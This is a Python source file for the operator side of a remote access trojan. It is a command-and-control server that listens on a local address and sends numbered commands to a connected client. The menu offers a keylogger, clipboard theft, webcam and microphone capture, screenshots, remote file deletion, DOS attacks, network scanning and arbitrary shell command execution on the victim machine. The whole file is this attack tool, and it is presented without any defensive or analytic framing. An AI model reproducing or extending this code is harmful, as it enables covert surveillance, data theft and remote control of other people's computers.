import time
import socket
import os

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "192.168.1.20"
    port = 8080
    
    try:
        s.bind((host, port))
        print("\nWaiting for incoming connection...")
        s.listen(10)
        
        while True:
            conn, addr = s.accept()
            print(f"\nClient is connected to the server now from address {addr}\n")
            
            while True:
                try:
                    print("Waiting for command...")
                    choice = input("1. Shutdown\n2. Restart\n3. DOS Attack\n4. Send File\n5. Remove File\n6. Keylogger\n7. Exit\n8. Port Scan\n9. Vulnerability Scan\n10. Screenshot Capture\n11. Clipboard Monitoring\n12. Webcam Capture\n13. System Info\n14. Process List\n15. Microphone Recording\n16. Network Info\n17. File System Exploration\n18. Command Execution\n19. System Uptime\nEnter your choice: ")
                    
                    if choice == "1":
                        conn.sendall("1".encode())
                        print("Shutdown command sent.")
                    elif choice == "2":
                        conn.sendall("2".encode())
                        print("Restart command sent.")
                    elif choice == "3":
                        conn.sendall("3".encode())
                        print("DOS Attack command sent.")
                    elif choice == "4":
                        conn.sendall("4".encode())
                        file_path = input("Enter the file path to send: ")
                        
                        if os.path.exists(file_path):
                            file_name = os.path.basename(file_path)
                            file_size = os.path.getsize(file_path)
                            conn.sendall(f"{file_name}|{file_size}".encode())
                            print(f"File transfer command sent for file {file_name} with size {file_size} bytes.")
                            
                            # Wait for acknowledgment from client
                            ack = conn.recv(1024).decode()
                            if ack == "READY":
                                with open(file_path, "rb") as f:
                                    while (data := f.read(1024)):
                                        conn.sendall(data)
                                print("File sent successfully!\n")
                                # Wait for client to acknowledge file transfer completion
                                transfer_ack = conn.recv(1024).decode()
                                if transfer_ack == "DONE":
                                    print("File transfer acknowledged by client.\n")
                            else:
                                print("Client not ready for file transfer.\n")
                        else:
                            print("File not found!\n")
                    elif choice == "5":
                        conn.sendall("5".encode())
                        file_path = input("Enter the file path to remove on client: ")
                        conn.sendall(file_path.encode())
                        print(f"Remove file command sent for file {file_path}.")
                    elif choice == "6":
                        conn.sendall("6".encode())
                        print("Keylogger command sent.")
                    elif choice == "7":
                        conn.sendall("7".encode())
                        print("Exit command sent.")
                        break
                    elif choice == "8":
                        conn.sendall("8".encode())
                        target = input("Enter the target IP address for port scanning: ")
                        conn.sendall(target.encode())
                        open_ports = conn.recv(4096).decode()
                        print(f"Open ports on {target}: {open_ports}")
                    elif choice == "9":
                        conn.sendall("9".encode())
                        target = input("Enter the target IP address for vulnerability scanning: ")
                        conn.sendall(target.encode())
                        scan_result = conn.recv(4096).decode()
                        print(f"Vulnerability scan result for {target}: {scan_result}")
                    elif choice == "10":
                        conn.sendall("10".encode())
                        print("Screenshot capture command sent.")
                    elif choice == "11":
                        conn.sendall("11".encode())
                        clipboard_content = conn.recv(4096).decode()
                        print(f"Clipboard content: {clipboard_content}")
                    elif choice == "12":
                        conn.sendall("12".encode())
                        print("Webcam capture command sent.")
                    elif choice == "13":
                        conn.sendall("13".encode())
                        system_info = conn.recv(4096).decode()
                        print(f"System Information: {system_info}")
                    elif choice == "14":
                        conn.sendall("14".encode())
                        processes = conn.recv(4096).decode()
                        print(f"Process list: {processes}")
                    elif choice == "15":
                        conn.sendall("15".encode())
                        print("Microphone recording command sent.")
                    elif choice == "16":
                        conn.sendall("16".encode())
                        network_info = conn.recv(4096).decode()
                        print(f"Network Information: {network_info}")
                    elif choice == "17":
                        conn.sendall("17".encode())
                        directory = input("Enter the directory path to list files: ")
                        conn.sendall(directory.encode())
                        files = conn.recv(4096).decode()
                        print(f"Files in directory {directory}: {files}")
                    elif choice == "18":
                        conn.sendall("18".encode())
                        shell_command = input("Enter the shell command to execute: ")
                        conn.sendall(shell_command.encode())
                        output = conn.recv(4096).decode()
                        print(f"Command output: {output}")
                    elif choice == "19":
                        conn.sendall("19".encode())
                        uptime = conn.recv(4096).decode()
                        print(f"System Uptime: {uptime}")
                    else:
                        print("Enter a valid choice.\n")
                    
                    # Wait for acknowledgment from client after each command
                    ack = conn.recv(1024).decode()
                    if ack == "DONE":
                        print("Command executed successfully.\n")
                    else:
                        print("Error in command execution.\n")
                except (socket.error, ConnectionResetError) as e:
                    print(f"Connection lost: {e}")
                    break
    
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        if 'conn' in locals():
            conn.close()
        s.close()

if __name__ == "__main__":
    start_server()